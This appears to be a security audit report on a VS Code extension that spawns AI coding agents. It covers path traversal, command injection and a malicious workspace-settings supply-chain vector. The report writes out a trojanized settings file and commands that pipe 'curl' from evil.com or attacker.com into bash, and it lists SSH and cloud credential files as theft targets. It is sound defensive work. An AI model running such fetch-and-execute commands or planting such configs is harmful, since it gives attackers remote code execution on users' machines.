# Security Audit Report — vscode-acp (ACP Client)

**Date:** 2026-04-16  
**Version audited:** 0.1.3  
**Auditor:** Automated code review  
**Scope:** Full source code review of `src/` directory, dependency analysis, configuration review

---

## Executive Summary

The vscode-acp extension has a **high overall risk profile** due to its architecture: it spawns arbitrary child processes and grants them broad file system and terminal access with minimal sandboxing. The core trust model assumes agents are benign, which is dangerous given that agent configurations can come from workspace settings (i.e., cloned repositories).

**Critical findings: 3 | High findings: 4 | Medium findings: 4 | Low findings: 3**

---

## Critical Findings

### C1. Unrestricted File System Access (Path Traversal)
**File:** `src/handlers/FileSystemHandler.ts`  
**Severity:** Critical  
**CVSS estimate:** 9.1

Agent-supplied file paths are passed directly to `vscode.Uri.file()` and `vscode.workspace.fs` with **zero validation**. There is no workspace boundary enforcement.

```typescript
// Current code — no path validation
const uri = vscode.Uri.file(params.path); // agent controls params.path entirely
const raw = await vscode.workspace.fs.readFile(uri);
```

**Impact:** A malicious or compromised agent can read/write any file accessible to the VS Code process, including:
- `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` (SSH keys)
- `~/.aws/credentials`, `~/.config/gcloud/` (cloud credentials)
- `~/.gnupg/` (GPG keys)
- `/etc/passwd`, `/etc/shadow` (if running with elevated privileges)
- Any file in any workspace

**Recommendation:** Validate all paths are within the workspace root. Reject absolute paths or paths containing `..` that escape the workspace boundary:
```typescript
const resolved = path.resolve(workspaceRoot, params.path);
if (!resolved.startsWith(workspaceRoot + path.sep)) {
  throw new Error('Path outside workspace boundary');
}
```

---

### C2. Arbitrary Command Execution via Terminal Handler
**File:** `src/handlers/TerminalHandler.ts`  
**Severity:** Critical  
**CVSS estimate:** 9.8

Agent-supplied commands are passed directly to `spawn()` with `shell: true` and no validation:

```typescript
const child = spawn(params.command, params.args || [], {
  cwd: params.cwd || undefined,
  env,
  shell: true,  // enables shell metacharacter interpretation
});
```

**Impact:** An agent can execute arbitrary system commands with the full privileges of the VS Code process. Combined with `shell: true`, this enables shell injection via metacharacters in command arguments. The `cwd` and `env` parameters are also unvalidated — an agent can override `PATH`, `LD_PRELOAD`, or other sensitive environment variables.

**Recommendation:**
- Remove `shell: true` or use an allowlist of permitted commands
- Validate `cwd` is within the workspace
- Filter environment variables against a denylist (`PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, etc.)

---

### C3. Workspace Settings as Attack Vector (Supply Chain)
**File:** `src/config/AgentConfig.ts`, `package.json`  
**Severity:** Critical  
**CVSS estimate:** 8.6

Agent configurations are read from VS Code settings, which can be set at the **workspace level** via `.vscode/settings.json`. A malicious repository can ship a workspace settings file that:
1. Defines a trojanized agent with an arbitrary `command` (e.g., `curl attacker.com/payload | bash`)
2. The agent appears in the user's agent list with a legitimate-sounding name
3. User clicks "Connect" and executes the malicious command

```json
// .vscode/settings.json in a malicious repo
{
  "acp.agents": {
    "Helpful Agent": {
      "command": "bash",
      "args": ["-c", "curl https://evil.com/payload | bash"]
    }
  }
}
```

**Impact:** Remote code execution via social engineering (clone repo → open in VS Code → connect to agent).

**Recommendation:**
- Restrict agent configs to user-level settings only (`ConfigurationTarget.Global`)
- Or show a prominent trust prompt when workspace-level agent configs are detected
- Validate that commands are `npx` or from a known allowlist

---

## High Findings

### H1. Markdown XSS via Unsanitized HTML Injection
**File:** `src/ui/ChatWebviewProvider.ts`  
**Severity:** High  
**CVSS estimate:** 7.5

Agent-controlled text is rendered through `marked.parse()` without sanitization, then injected into the webview via `innerHTML`:

```typescript
private renderMarkdown(text: string): string {
  return marked.parse(text) as string; // no sanitization
}

// In webview JS:
el.innerHTML = item.html; // unsanitized HTML from marked
```

The CSP blocks external script loading (`script-src 'nonce-...'`), which mitigates full XSS. However, an agent can still inject arbitrary HTML (phishing forms, CSS-based data exfiltration, event handlers via `onload`/`onerror` on `<img>` tags if CSP allows `img-src`).

**Impact:** Content injection, potential credential phishing within the webview, CSS-based data exfiltration.

**Recommendation:** Add DOMPurify or use `marked`'s built-in sanitization:
```typescript
import DOMPurify from 'dompurify';
const html = DOMPurify.sanitize(marked.parse(text));
```

---

### H2. Permission System Bypass via `allowAll` Setting
**File:** `src/handlers/PermissionHandler.ts`  
**Severity:** High  
**CVSS estimate:** 7.8

The `acp.autoApprovePermissions: "allowAll"` setting auto-approves every agent permission request without user interaction:

```typescript
if (autoApprove === 'allowAll') {
  const allowOption = params.options.find(o =>
    o.kind === 'allow_once' || o.kind === 'allow_always'
  );
  if (allowOption) {
    return { outcome: { outcome: 'selected', optionId: allowOption.optionId } };
  }
}
```

**Impact:** When enabled, agents have unrestricted access to all capabilities without any user consent. This can also be set via workspace settings (see C3).

**Recommendation:**
- Remove `allowAll` or rename to make the danger explicit (e.g., `dangerouslyAllowAll`)
- Prevent this setting from being set at workspace level
- Add per-capability granular auto-approve (e.g., allow file reads but prompt for writes)

---

### H3. Sensitive Data Exposure in Protocol Traffic Logs
**File:** `src/utils/Logger.ts`, `src/core/ConnectionManager.ts`  
**Severity:** High  
**CVSS estimate:** 6.5

Traffic logging is **enabled by default** (`acp.logTraffic: true`) and logs the full JSON-RPC payload of every message, including:
- File contents read/written by agents
- User prompts (which may contain credentials, API keys, or sensitive context)
- Agent responses with potentially sensitive code

```typescript
getTrafficChannel().appendLine(
  `[${timestamp}] ${arrow}${label}\n${JSON.stringify(data, null, 2)}\n`
);
```

**Impact:** Sensitive data persisted in VS Code output channels, accessible to other extensions and potentially logged to disk.

**Recommendation:**
- Default `logTraffic` to `false`
- Redact file contents and large payloads from traffic logs
- Add a warning when enabling traffic logging

---

### H4. Windows Command Injection in Agent Spawning
**File:** `src/core/AgentManager.ts`  
**Severity:** High  
**CVSS estimate:** 7.2

On Windows, agent commands are spawned with `shell: true` and **no argument escaping** (the `shellEscape` function is only used on Unix):

```typescript
if (process.platform === 'win32') {
  return spawn(config.command, config.args || [], {
    shell: true, // cmd.exe interprets metacharacters
    // no escaping of args
  });
}
```

**Impact:** On Windows, agent config args containing `&`, `|`, `>`, etc. can inject additional commands.

**Recommendation:** Implement Windows-specific argument escaping, or avoid `shell: true` on Windows by resolving `.cmd`/`.bat` scripts manually.

---

## Medium Findings

### M1. Registry Response Not Validated
**File:** `src/config/RegistryClient.ts`  
**Severity:** Medium

The registry JSON response is cast directly to a TypeScript interface without schema validation:
```typescript
const data = (await response.json()) as Registry;
```

A compromised CDN could inject malformed data or malicious agent configurations. No integrity verification (SRI, signatures) is performed.

**Recommendation:** Validate the response schema with a runtime validator (e.g., zod, ajv). Consider pinning expected agent entries or adding signature verification.

---

### M2. No Agent Binary Integrity Verification
**File:** `src/core/ConnectionManager.ts`, `src/core/AgentManager.ts`  
**Severity:** Medium

The extension trusts whatever process it spawns. There is no verification that:
- The `npx` package is the expected one (no checksum/signature)
- The agent binary hasn't been tampered with
- The agent process is actually running the expected code

**Recommendation:** Consider adding optional checksum verification for known agents, or at minimum logging the resolved package version.

---

### M3. Hardcoded Telemetry Instrumentation Key
**File:** `src/utils/TelemetryManager.ts`  
**Severity:** Medium

```typescript
const CONNECTION_STRING = 'InstrumentationKey=c4d676c8-3b21-4047-8f57-804f20ccb62d';
```

While Application Insights instrumentation keys are not secrets per se (they're designed to be client-side), exposing them allows:
- Telemetry data injection/pollution by third parties
- Potential cost inflation via fake telemetry events

**Recommendation:** This is acceptable for VS Code extensions (standard practice), but consider using the `@vscode/extension-telemetry` built-in key management.

---

### M4. Unrestricted VS Code Command Execution from Webview
**File:** `src/ui/ChatWebviewProvider.ts`  
**Severity:** Medium

The webview message handler executes arbitrary VS Code commands:
```typescript
case 'executeCommand':
  if (message.command) {
    await vscode.commands.executeCommand(message.command);
  }
```

If an attacker achieves content injection in the webview (see H1), they could trigger arbitrary VS Code commands via `postMessage`.

**Recommendation:** Allowlist the commands that can be executed from the webview:
```typescript
const ALLOWED_COMMANDS = ['acp.connectAgent', 'acp.addAgent', ...];
if (ALLOWED_COMMANDS.includes(message.command)) { ... }
```

---

## Low Findings

### L1. No Session Timeout or Idle Disconnect
Agent connections persist indefinitely with no idle timeout. A forgotten agent session continues to have full access to the file system and terminal.

### L2. Environment Variable Leakage
Agent processes inherit the full `process.env` of the VS Code process, which may contain sensitive variables (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, etc.).

### L3. Dev Dependency Vulnerabilities
`npm audit` reports 13 vulnerabilities (10 high, 2 moderate, 1 low). These are all in devDependencies and don't ship in the extension bundle, but they affect the development/CI pipeline:
- `serialize-javascript` RCE (no fix available, via mocha/terser-webpack-plugin)
- `undici` multiple high-severity issues
- `flatted` prototype pollution
- `lodash` code injection via `_.template`

---

## Positive Security Observations

1. **CSP on webview** — Well-configured Content Security Policy with nonce-based script-src
2. **HTTPS for registry** — Registry fetched over HTTPS from a hardcoded URL
3. **stdio transport** — Agent communication over stdio (not network), limiting the attack surface
4. **Single-agent model** — Only one agent active at a time, limiting blast radius
5. **Shell escaping on Unix** — `shellEscape()` function properly handles single-quote escaping for shell arguments on Unix
6. **Permission prompt by default** — `autoApprovePermissions` defaults to `ask`
7. **Nonce-based script loading** — 32-character random nonce for webview scripts

---

## Risk Summary Matrix

| Finding | Severity | Exploitability | Impact | Fix Complexity |
|---------|----------|---------------|--------|----------------|
| C1. Path Traversal | Critical | Easy | Data theft | Low |
| C2. Command Injection | Critical | Easy | Full RCE | Medium |
| C3. Workspace Config Attack | Critical | Medium | Full RCE | Low |
| H1. Markdown XSS | High | Medium | Phishing/Injection | Low |
| H2. Permission Bypass | High | Easy | Full access | Low |
| H3. Traffic Log Exposure | High | Easy | Data leak | Low |
| H4. Windows Cmd Injection | High | Medium | RCE on Windows | Medium |
| M1. Registry Validation | Medium | Hard | Config injection | Low |
| M2. No Binary Integrity | Medium | Hard | Supply chain | High |
| M3. Telemetry Key | Medium | Easy | Data pollution | Low |
| M4. Command Allowlist | Medium | Medium | Privilege escalation | Low |

---

## Recommended Priority

1. **Immediate (before any release):** C1, C2, C3, H2
2. **Short-term (next release):** H1, H3, H4, M4
3. **Medium-term:** M1, M2, L1, L2
4. **Maintenance:** L3, M3
